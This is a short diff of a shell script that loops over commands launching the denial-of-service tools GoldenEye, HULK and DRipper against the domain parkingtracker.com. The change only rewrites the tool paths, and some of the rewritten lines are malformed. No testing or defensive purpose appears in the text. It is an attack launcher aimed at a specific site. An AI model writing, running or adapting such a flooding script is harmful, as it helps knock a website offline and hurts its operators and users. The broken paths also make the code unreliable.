@@ -2,9 +2,9 @@
 
 # Define the commands in an array
 commands=(
-  "./python_attack/python3 goldeneye.py http://parkingtracker.com"
-  "./python_attack/python3 hulk.py"
-  "./python_attack/python3 DRipper.py -s parkingtracker.com"
+  "python3 ./dos_ge/goldeneye.py http://parkingtracker.com"
+  "python3 ./dos_hulk_/python3 hulk.py"
+  "python3 ./dos_ripper_ DRipper.py -s parkingtracker.com"
 )
 
 # Loop through each command
